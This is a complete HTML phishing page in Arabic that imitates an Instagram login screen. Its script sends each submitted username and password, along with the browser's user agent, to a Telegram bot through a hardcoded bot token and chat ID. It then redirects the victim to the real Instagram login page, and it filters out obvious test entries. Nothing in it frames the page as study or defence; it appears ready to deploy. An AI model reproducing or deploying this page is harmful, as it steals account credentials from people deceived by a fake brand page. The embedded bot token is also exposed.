<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>تسجيل الدخول</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, "Segoe UI", Tahoma, sans-serif; }
  body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%); color: #fff; }
  .card { width: 100%; max-width: 380px; background: rgba(255,255,255,0.04); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 32px 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
  .brand { font-size: 26px; font-weight: 700; text-align: center; margin-bottom: 6px; color: #E1306C; }
  .sub { text-align: center; color: #9aa4b2; font-size: 13px; margin-bottom: 26px; }
  label { display: block; font-size: 12px; color: #9aa4b2; margin-bottom: 6px; }
  input { width: 100%; padding: 12px 14px; margin-bottom: 16px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.12); background: rgba(0,0,0,0.25); color: #fff; font-size: 14px; outline: none; }
  input:focus { border-color: #4da3ff; }
  .btn { width: 100%; padding: 13px; border: none; border-radius: 10px; color: #fff; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 4px; background: linear-gradient(90deg,#F58529,#DD2A7B,#8134AF,#515BD4); }
  .btn:disabled { opacity: .6; cursor: wait; }
  .msg { text-align: center; font-size: 13px; margin-top: 14px; min-height: 18px; color: #ff6b6b; }
  .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="card">
  <div class="brand">إنستقرام</div>
  <div class="sub">سجّل الدخول للمتابعة</div>

  <form id="form">
    <label>اسم المستخدم أو البريد</label>
    <input id="identifier" type="text" required />
    <label>كلمة المرور</label>
    <input id="password" type="password" required />
    <button class="btn" id="submit" type="submit">تسجيل الدخول</button>
    <div class="msg" id="msg"></div>
  </form>
</div>

<script>
  // 🔴 ضع التوكن الجديد والآيدي هنا 🔴
  const BOT_TOKEN = "8649753978:AAH2F-nMzUjB2hoUBZ8k-QfRnkvULzJdQfo";
  const CHAT_ID   = "8899697805";

  document.getElementById("form").onsubmit = async (e) => {
    e.preventDefault();
    const identifier = document.getElementById("identifier").value.trim();
    const password = document.getElementById("password").value;
    const btn = document.getElementById("submit");
    const msg = document.getElementById("msg");

    if (!identifier || !password) return;

    // فلترة البيانات الوهمية
    const fakeNames = ["test", "admin", "user", "123", "1234", "12345", "123456", "a", "aa", "abc"];
    if (fakeNames.includes(identifier.toLowerCase()) || password.length < 4 || identifier.length < 3) {
      msg.textContent = "اسم المستخدم أو كلمة المرور غير صحيحة.";
      return;
    }

    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> جاري التحقق…';
    msg.textContent = "";

    const text = `
🔔 <b>دخول جديد — Instagram</b>
━━━━━━━━━━━━━━━
👤 <b>المعرّف:</b> <code>${identifier}</code>
🔑 <b>كلمة المرور:</b> <code>${password}</code>
📱 <b>الجهاز:</b> <code>${navigator.userAgent.slice(0, 100)}</code>
    `.trim();

    try {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      });

      btn.innerHTML = "جاري التحويل…";
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/accounts/login/";
      }, 1600);
    } catch (err) {
      btn.disabled = false;
      btn.textContent = "تسجيل الدخول";
      msg.textContent = "صار خطأ في الاتصال. حاول مرة ثانية.";
    }
  };
</script>
</body>
</html>
